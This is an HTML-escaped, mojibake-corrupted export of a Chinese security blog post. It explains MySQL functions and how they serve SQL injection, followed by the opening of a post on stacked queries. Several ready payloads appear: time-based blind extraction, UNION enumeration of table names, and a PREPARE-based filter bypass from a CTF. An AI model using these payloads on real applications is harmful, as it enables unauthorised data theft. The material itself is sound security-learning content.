&lt;h2 id=&quot;ifnullexpr1expr2&quot;&gt;IFNULL(expr1,expr2)&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;expr1&lt;/strong&gt;ä¸ä¸º&lt;strong&gt;NULL&lt;/strong&gt;ï¼Œè¿”å›å€¼å°±æ˜¯&lt;strong&gt;expr1&lt;/strong&gt;ï¼Œå¦åˆ™è¿”å›å€¼ä¸º&lt;strong&gt;expr2&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select ifnull(1,9);
+-------------+
| ifnull(1,9) |
+-------------+
|           1 |
+-------------+
1 row in set (0.00 sec)
mysql&amp;gt; select ifnull(null,9);
+----------------+
| ifnull(null,9) |
+----------------+
|              9 |
+----------------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è´´ä¸€ä¸ªæ—¶é—´ç›²æ³¨payloadæ¥è‡ªå¿˜è®°å“ªé‡Œ&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id = -2441 OR (ORD(MID((SELECT IFNULL(CAST(FirstName AS CHAR),0x20) FROM user ORDER BY id LIMIT 1,1),2,1))&amp;gt;112)#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;eltnstr1str2&quot;&gt;ELT(N,str1,str2,â€¦)&lt;/h2&gt;

&lt;p&gt;å¦‚æœ&lt;strong&gt;N=1&lt;/strong&gt;è¿”å›&lt;strong&gt;str1&lt;/strong&gt;ï¼Œå¦‚æœ&lt;strong&gt;N=2&lt;/strong&gt;è¿”å›&lt;strong&gt;str2&lt;/strong&gt;ï¼Œå¦‚æœå‚æ•°çš„æ•°é‡å°äº&lt;strong&gt;1&lt;/strong&gt;æˆ–å¤§äº&lt;strong&gt;N&lt;/strong&gt;ï¼Œè¿”å›&lt;strong&gt;NULL&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select * from vorname where Vorname='Lina' and elt(1,sleep(1));
Empty set (1.00 sec)

mysql&amp;gt; select * from vorname where Vorname='Lina' and elt(1,sleep(1));
Empty set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç”¨çš„æ—¶å€™åŠ ä¸Š&lt;strong&gt;andçŸ­è·¯è¿ç®—è§„åˆ™&lt;/strong&gt;å¯ä»¥è¿›è¡Œæ—¶é—´ç›²æ³¨&lt;/p&gt;

&lt;h2 id=&quot;fieldstrstr1str2&quot;&gt;FIELD(str,str1,str2,â€¦)&lt;/h2&gt;

&lt;p&gt;ä¸&lt;strong&gt;ELT&lt;/strong&gt;äº’è¡¥ï¼Œåœ¨&lt;strong&gt;str1&lt;/strong&gt;ï¼Œ&lt;strong&gt;str2&lt;/strong&gt;ä¸­å¯»æ‰¾&lt;strong&gt;str&lt;/strong&gt;ï¼Œè¿”å›æ‰¾åˆ°çš„ä¸‹æ ‡&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select * from vorname where Vorname='Lina' and field(0,sleep(1));
+---------+-----------+-----+
| Vorname | Nachname  | Alt |
+---------+-----------+-----+
| Lina    | Schneider |  22 |
+---------+-----------+-----+
1 row in set (1.00 sec)

mysql&amp;gt; select * from vorname where Vorname='Lina' and field(1,sleep(1));
Empty set (1.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç”¨çš„æ—¶å€™åŠ ä¸Š&lt;strong&gt;andçŸ­è·¯è¿ç®—è§„åˆ™&lt;/strong&gt;å¯ä»¥è¿›è¡Œæ—¶é—´ç›²æ³¨&lt;/p&gt;

&lt;h2 id=&quot;åˆ«å&quot;&gt;åˆ«å&lt;/h2&gt;

&lt;p&gt;æœ‰ä¸ªä¼˜ç‚¹åº”è¯¥å°±æ˜¯ï¼Œé˜²æ­¢åˆ—åå¤ªé•¿ï¼Œæˆ–å¯ä»¥ç»™æœªçŸ¥åˆ—åèµ·åå­—ï¼Œä¹Ÿå°±æ˜¯æ— åˆ—åæ³¨å…¥&lt;/p&gt;

&lt;p&gt;ğŸ¤³å…¶ä¸­aså¯ä»¥çœç•¥&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select if(Alt=22,'yes','no') from vorname;
+-----------------------+
| if(Alt=22,'yes','no') |
+-----------------------+
| yes                   |
| no                    |
| no                    |
| yes                   |
+-----------------------+
4 rows in set (0.00 sec)


mysql&amp;gt; select if(Alt=22,'yes','no') as '22_or_not' from vorname;
+-----------+
| 22_or_not |
+-----------+
| yes       |
| no        |
| no        |
| yes       |
+-----------+
4 rows in set (0.00 sec)


mysql&amp;gt; select if(Alt=22,'yes','no')'22_or_not' from vorname;
+-----------+
| 22_or_not |
+-----------+
| yes       |
| no        |
| no        |
| yes       |
+-----------+
4 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;payloadæ¥è‡ªxrayï¼Œå…¶ä¸­çš„aæ˜¯åˆ«å&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=7'and(select*from(select+sleep(2))a/**/union/**/select+1)='
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/190266.html&quot;&gt;è¿™ä¸ªäºº&lt;/a&gt;å¾ˆéªšï¼Œå¥½å°è¯•äº†åˆ«ååµŒå¥—&lt;/p&gt;

&lt;p&gt;select â€˜1â€™;&lt;/p&gt;

&lt;p&gt;select * from(select â€˜1â€™)a;&lt;/p&gt;

&lt;p&gt;select * from(select * from(select â€˜1â€™)a)a;â€¦â€¦&lt;/p&gt;

&lt;p&gt;èƒ½å¥—64å±‚w(ï¾ŸĞ”ï¾Ÿ)w&lt;/p&gt;

&lt;h2 id=&quot;cast&quot;&gt;CAST&lt;/h2&gt;

&lt;p&gt;CASTå‡½æ•°ç”¨äºå°†æŸç§æ•°æ®ç±»å‹çš„è¡¨è¾¾å¼æ˜¾å¼è½¬æ¢ä¸ºå¦ä¸€ç§æ•°æ®ç±»å‹&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Format&lt;/th&gt;
      &lt;th&gt;Definition&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;DATE&lt;/td&gt;
      &lt;td&gt;æ—¥æœŸ&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;TIME&lt;/td&gt;
      &lt;td&gt;æ—¶é—´&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DATETIME&lt;/td&gt;
      &lt;td&gt;æ—¥æœŸæ—¶é—´å‹&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DECIMAL&lt;/td&gt;
      &lt;td&gt;æµ®ç‚¹æ•°&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;CHAR&lt;/td&gt;
      &lt;td&gt;å­—ç¬¦å‹ï¼Œå¯å¸¦å‚æ•°&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select cast(12 as decimal);
+---------------------+
| cast(12 as decimal) |
+---------------------+
|                  12 |
+---------------------+
1 row in set (0.00 sec)

mysql&amp;gt; select cast('' as decimal);
+---------------------+
| cast('' as decimal) |
+---------------------+
|                   0 |
+---------------------+
1 row in set, 1 warning (0.00 sec)

mysql&amp;gt; select cast('12' as decimal);
+-----------------------+
| cast('12' as decimal) |
+-----------------------+
|                    12 |
+-----------------------+
1 row in set (0.00 sec)

mysql&amp;gt; select cast(now() as char);
+---------------------+
| cast(now() as char) |
+---------------------+
| 2020-03-26 14:58:35 |
+---------------------+
1 row in set (0.00 sec)

mysql&amp;gt; select cast(database() as char);
+--------------------------+
| cast(database() as char) |
+--------------------------+
| test                     |
+--------------------------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;concatconcat_wsgroup_concat&quot;&gt;CONCAT&amp;amp;CONCAT_WS&amp;amp;GROUP_CONCAT&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Function&lt;/th&gt;
      &lt;th&gt;Differences&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;concat(str1,str2,â€¦)&lt;/td&gt;
      &lt;td&gt;æ²¡æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;concat_ws(separator,str1,str2,â€¦)&lt;/td&gt;
      &lt;td&gt;å«æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;group_concat(str1,str2,â€¦)&lt;/td&gt;
      &lt;td&gt;è¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;concat&quot;&gt;CONCAT&lt;/h3&gt;

&lt;p&gt;æ²¡æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select concat(Vorname,'~',Nachname) from vorname;
+------------------------------+
| concat(Vorname,'~',Nachname) |
+------------------------------+
| Lina~Schneider               |
| Lara~Zhang                   |
| Patric~Wang                  |
| Tobias~Ai                    |
+------------------------------+
4 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;concat_ws&quot;&gt;CONCAT_WS&lt;/h3&gt;

&lt;p&gt;å«æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select concat_ws('~',Vorname,Alt) from vorname;
+----------------------------+
| concat_ws('~',Vorname,Alt) |
+----------------------------+
| Lina~22                    |
| Lara~20                    |
| Patric~23                  |
| Tobias~22                  |
+----------------------------+
4 rows in set (0.00 sec)

mysql&amp;gt; select concat_ws('~',Vorname,Nachname,Alt) from vorname;
+-------------------------------------+
| concat_ws('~',Vorname,Nachname,Alt) |
+-------------------------------------+
| Lina~Schneider~22                   |
| Lara~Zhang~20                       |
| Patric~Wang~23                      |
| Tobias~Ai~22                        |
+-------------------------------------+
4 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;group_concat&quot;&gt;GROUP_CONCAT&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select group_concat(Vorname,'~',Nachname),Alt from vorname group by Alt;
+------------------------------------+-----+
| group_concat(Vorname,'~',Nachname) | Alt |
+------------------------------------+-----+
| Lara~Zhang                         |  20 |
| Lina~Schneider,Tobias~Ai           |  22 |
| Patric~Wang                        |  23 |
+------------------------------------+-----+
3 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¸¸è§çš„unionè”åˆæŸ¥è¯¢æ³¨å…¥è¯­å¥ï¼Œè¯»å–å½“å‰æ•°æ®åº“çš„æ‰€æœ‰è¡¨å&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;group_concatconcat_ws&quot;&gt;GROUP_CONCAT+CONCAT_WS&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select group_concat(concat_ws('~',Vorname,Nachname)order by Nachname),Alt from vorname group by Alt;
+----------------------------------------------------------------+-----+
| group_concat(concat_ws('~',Vorname,Nachname)order by Nachname) | Alt |
+----------------------------------------------------------------+-----+
| Lara~Zhang                                                     |  20 |
| Tobias~Ai,Lina~Schneider                                       |  22 |
| Patric~Wang                                                    |  23 |
+----------------------------------------------------------------+-----+
3 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;order-by&quot;&gt;ORDER BY&lt;/h2&gt;

&lt;p&gt;sqlæ³¨å…¥çš„æ•™ç¨‹é‡Œç»å¸¸ç¬¬ä¸€æ­¥æ˜¯&lt;strong&gt;order by&lt;/strong&gt;ï¼Œå¥½å¤šåœ°æ–¹ä¼šå«&lt;strong&gt;æ˜¾ç¤ºä½&lt;/strong&gt;ï¼Œé‚£åŸç†æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ&lt;/p&gt;

&lt;p&gt;æ•ˆæœå¦‚ä¸‹ï¼Œå¦‚æœæ•°æ®è¡¨ä¸€å…±æœ‰3åˆ—ï¼Œå½“&lt;strong&gt;order by 4&lt;/strong&gt;æ—¶ï¼Œæç¤ºæ²¡æœ‰ç¬¬å››åˆ—&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select * from vorname where Alt=22 order by 1;   
+---------+-----------+-----+                           
| Vorname | Nachname  | Alt |                           
+---------+-----------+-----+                           
| Lina    | Schneider |  22 |                           
| Tobias  | Ai        |  22 |                           
+---------+-----------+-----+                           
2 rows in set (0.00 sec)  

mysql&amp;gt; select * from vorname where Alt=22 order by 2;   
+---------+-----------+-----+                           
| Vorname | Nachname  | Alt |                           
+---------+-----------+-----+                           
| Tobias  | Ai        |  22 |                           
| Lina    | Schneider |  22 |                           
+---------+-----------+-----+                           
2 rows in set (0.00 sec)                                
                                                        
mysql&amp;gt; select * from vorname where Alt=22 order by 3;   
+---------+-----------+-----+                           
| Vorname | Nachname  | Alt |                           
+---------+-----------+-----+                           
| Lina    | Schneider |  22 |                           
| Tobias  | Ai        |  22 |                           
+---------+-----------+-----+                           
2 rows in set (0.00 sec)                                
                                                        
mysql&amp;gt; select * from vorname where Alt=22 order by 4;   
ERROR 1054 (42S22): Unknown column '4' in 'order clause'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;order by&lt;/strong&gt;åŸç†æ˜¯æ’åºï¼Œ&lt;strong&gt;order by 1&lt;/strong&gt;å°±æ˜¯ä»¥ç¬¬ä¸€åˆ—æ’åºï¼ŒLinaåœ¨Tobiasä¹‹å‰ï¼Œ&lt;strong&gt;order by 2&lt;/strong&gt;æ˜¯ä»¥ç¬¬äºŒåˆ—æ’åºï¼ŒAiåœ¨Schneiderä¹‹å‰ï¼Œ&lt;strong&gt;order by 4&lt;/strong&gt;å°±å‡ºé”™è¾£ï¼Œå› ä¸ºæ²¡æœ‰ç¬¬å››åˆ—ã€‚å› æ­¤åœ¨æ³¨å…¥çš„ç¬¬ä¸€æ­¥å¯ä»¥ç”¨æ¥åˆ¤æ–­è¡¨çš„åˆ—æ•°ï¼Œè¿™ä¸ªä¹Ÿä¸ºå¤§å¤šæ•°sqlæ³¨å…¥çš„åä¸€æ­¥åšé“ºå«ï¼Œå› ä¸ºUNIONè¯­å¥éœ€è¦å‰åä¸¤ä¸ªçš„åˆ—æ•°ç›¸åŒã€‚&lt;/p&gt;

&lt;h2 id=&quot;union&quot;&gt;UNION&lt;/h2&gt;

&lt;p&gt;å‰é¢è¯´UNIONè¯­å¥éœ€è¦å‰åä¸¤ä¸ªçš„åˆ—æ•°ç›¸åŒï¼Œæ•ˆæœå¦‚ä¸‹ï¼Œåªæœ‰unionå‰åä¸ºç›¸åŒçš„åˆ—æ•°ï¼Œæ‰ä¸ä¼šå‡ºé”™&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select * from vorname where Alt=22 union select 1;
ERROR 1222 (21000): The used SELECT statements have a different number of columns
mysql&amp;gt; select * from vorname where Alt=22 union select 1,2;
ERROR 1222 (21000): The used SELECT statements have a different number of columns
mysql&amp;gt; select * from vorname where Alt=22 union select 1,2,3;
+---------+-----------+-----+
| Vorname | Nachname  | Alt |
+---------+-----------+-----+
| Lina    | Schneider |  22 |
| Tobias  | Ai        |  22 |
| 1       | 2         |   3 |
+---------+-----------+-----+
3 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åœ¨unionåä¸€æ®µä¸­çš„ç¬¬ä¸‰åˆ—è·å–è¯¥æ•°æ®åº“çš„ç”¨æˆ·å&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select * from vorname where Alt=22 union select 1,2,user();
+---------+-----------+----------------+
| Vorname | Nachname  | Alt            |
+---------+-----------+----------------+
| Lina    | Schneider | 22             |
| Tobias  | Ai        | 22             |
| 1       | 2         | root@localhost |
+---------+-----------+----------------+
3 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;prepare&quot;&gt;PREPARE&lt;/h2&gt;

&lt;p&gt;MYSQLçš„é¢„å¤„ç†è¯­å¥ç”±PREPAREã€EXECUTEã€DEALLOCATEç»„æˆ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;è¯­æ³•&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PREPARE stmt_name FROM preparable_stmt

EXECUTE stmt_name [USING @var_name [,@var_name]...]

{DEALLOCATE|DROP} PREPARE stmt_name
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;å®ä¾‹&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; prepare pr1 from 'select ?+?';
Query OK, 0 rows affected (0.00 sec)
Statement prepared

mysql&amp;gt; set @a=1,@b=10;
Query OK, 0 rows affected (0.00 sec)

mysql&amp;gt; execute pr1 using @a,@b;
+------+
| ?+?  |
+------+
|   11 |
+------+
1 row in set (0.00 sec)

mysql&amp;gt; execute pr1 using @a,@a;
+------+
| ?+?  |
+------+
|    2 |
+------+
1 row in set (0.00 sec)

mysql&amp;gt; execute pr1 using 1,2;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1,2' at line 1

mysql&amp;gt; deallocate prepare pr1;
Query OK, 0 rows affected (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è¿‡ç¨‹å¤§è‡´å¦‚ä¸Šï¼ŒğŸ‘Œå‡†å¤‡ä¸€æ¡è¯­å¥ï¼Œå‘½åä¸º&lt;strong&gt;pr1&lt;/strong&gt;ï¼Œå†…å®¹ä¸º&lt;strong&gt;â€˜select ?+?â€™&lt;/strong&gt;ï¼Œ&lt;strong&gt;â€˜select ?+?â€™&lt;/strong&gt;é‡Œçš„&lt;strong&gt;ï¼Ÿ&lt;/strong&gt;æ˜¯ç”¨æ¥å ä½çš„ã€‚è®¾ç½®å˜é‡&lt;strong&gt;a&lt;/strong&gt;å’Œ&lt;strong&gt;b&lt;/strong&gt;ï¼›ğŸ‘Œ&lt;strong&gt;execute&lt;/strong&gt;æ¥æ‰§è¡Œå‘½åä¸º&lt;strong&gt;pr1&lt;/strong&gt;çš„è¯­å¥ï¼Œä½¿ç”¨å˜é‡&lt;strong&gt;a&lt;/strong&gt;å’Œ&lt;strong&gt;b&lt;/strong&gt;ï¼Œä¸å¯ä»¥æ˜¯&lt;strong&gt;1&lt;/strong&gt;å’Œ&lt;strong&gt;2&lt;/strong&gt;è¿™æ ·çš„æ•°å­—ï¼›ğŸ‘Œ&lt;strong&gt;deallocate&lt;/strong&gt;é‡Šæ”¾æ‰§è¡Œä¸­ä½¿ç”¨çš„æ•°æ®åº“èµ„æº&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;æ„ä¹‰&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;âœå¯ä»¥å‡å°‘æ¯æ¬¡æ‰§è¡ŒSQLè¯­æ³•åˆ†æï¼Œæ¯”å¦‚&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PREPARE stmt1 FROM 'SELECT productCode, productName
                    FROM products
                    WHERE productCode = ?';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¹‹ååªéœ€è¦&lt;strong&gt;set&lt;/strong&gt;ä¸åŒçš„&lt;strong&gt;productCode&lt;/strong&gt;å€¼ï¼Œå†&lt;strong&gt;execute&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;âœå¯ä»¥åœ¨å…³é”®è¯è¢«è¿‡æ»¤çš„æ—¶å€™æ‹¼æ¥å…³é”®è¯è¿›è¡Œç»•è¿‡ï¼Œæ¯”å¦‚çœ‹åˆ°çš„ä¸€ä¸ªå¯ä»¥å †å æ³¨å…¥çš„payload&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;âœé˜²æ­¢SQLæ³¨å…¥ï¼ˆå…³äºé—®å·å ä½ç¬¦å¯ä»¥é˜²æ­¢æ³¨å…¥çš„äº‹æƒ…ï¼Œæœ‰æœå‡ºæ¥å¥½å¤šä¸œè¥¿ï¼Œæœ‰ç©ºå†æ•´ç†å­¦ä¹ ä¸€ä¸‹ï¼ˆå—&lt;/p&gt;

&lt;h1 id=&quot;refer&quot;&gt;Refer&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;shenmedoumeiyou&quot;&gt;https://xz.aliyun.com/t/5505&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;dianjibunengtiaozhuan&quot;&gt;https://www.k0rz3n.com/2019/02/21/ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£ SQL ç›²æ³¨/&lt;/a&gt;&lt;/p&gt;</content><author><name>true</name></author><category term="SQLæ³¨å…¥" /><summary type="html"></summary></entry><entry><title type="html">SQLæ³¨å…¥-å †å æ³¨å…¥</title><link href="http://localhost:4000/blog/sqli-stacked-queries/" rel="alternate" type="text/html" title="SQLæ³¨å…¥-å †å æ³¨å…¥" /><published>2020-04-08T10:10:57+08:00</published><updated>2020-04-08T10:10:57+08:00</updated><id>http://localhost:4000/blog/sqli-stacked-queries</id><content type="html" xml:base="http://localhost:4000/blog/sqli-stacked-queries/">&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#stacked-queries&quot; id=&quot;markdown-toc-stacked-queries&quot;&gt;Stacked Queries&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#principle&quot; id=&quot;markdown-toc-principle&quot;&gt;Principle&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#stacked-queries-limitations&quot; id=&quot;markdown-toc-stacked-queries-limitations&quot;&gt;Stacked Queries Limitations&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#altering-data&quot; id=&quot;markdown-toc-altering-data&quot;&gt;Altering Data&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#calling-stored-procedures&quot; id=&quot;markdown-toc-calling-stored-procedures&quot;&gt;Calling Stored Procedures&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ein-beispiel&quot; id=&quot;markdown-toc-ein-beispiel&quot;&gt;Ein Beispiel&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#æ€è·¯&quot; id=&quot;markdown-toc-æ€è·¯&quot;&gt;æ€è·¯&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#refer&quot; id=&quot;markdown-toc-refer&quot;&gt;Refer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;å †å æ³¨å…¥&lt;/code&gt;ğŸ¤’&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;å †æŸ¥è¯¢æ³¨å…¥&lt;/code&gt;ğŸ¤’&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;å †æ³¨å…¥&lt;/code&gt;ğŸ¤’&lt;/p&gt;

&lt;p&gt;ğŸ¤”å®³ï¼Œå…¶å®å°±æ˜¯å¤šè¯­å¥æ³¨å…¥ï¼Œç”¨åˆ†å·ã€‚&lt;/p&gt;

&lt;p&gt;è¿™ç¯‡æ–‡ç« å…ˆç¿»è¯‘ä¸€ä¸ªä¸çŸ¥é“ä»å“ªçœ‹æ¥çš„è®²å †å æ³¨å…¥çš„æ–‡ç« ï¼Œundå¤ç°å¼ºç½‘æ¯2019çš„ä¸€ä¸ªé¢˜ç›®&lt;/p&gt;

&lt;h1 id=&quot;stacked-queries&quot;&gt;Stacked Queries&lt;/h1&gt;

&lt;p&gt;å…ˆç¿»è¯‘ä¸€ä¸‹&lt;a href=&quot;https://www.sqlinjection.net/stacked-queries/&quot;&gt;SQLæ³¨å…¥ç½‘ç«™ä¸­çš„ä¸€ç¯‡æ–‡ç« &lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Execute multiple statements in the same query to extend the possibilities of SQL injections.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;åœ¨ä¸€ä¸ªæŸ¥è¯¢ä¸­æ‰§è¡Œå¤šä¸ªè¯­å¥ï¼Œä»¥æ‰©å±•SQLæ³¨å…¥çš„å¯èƒ½æ€§ã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Stacked queries provide a lot of control to the attacker. By terminating the original query and adding a new one, it will be possible to modify data and call stored procedures. This technique is massively used in SQL injection attacks and understanding its principle is essential to a sound understanding of this security issue.&lt;/p&gt;
&lt;/blockquote&gt;

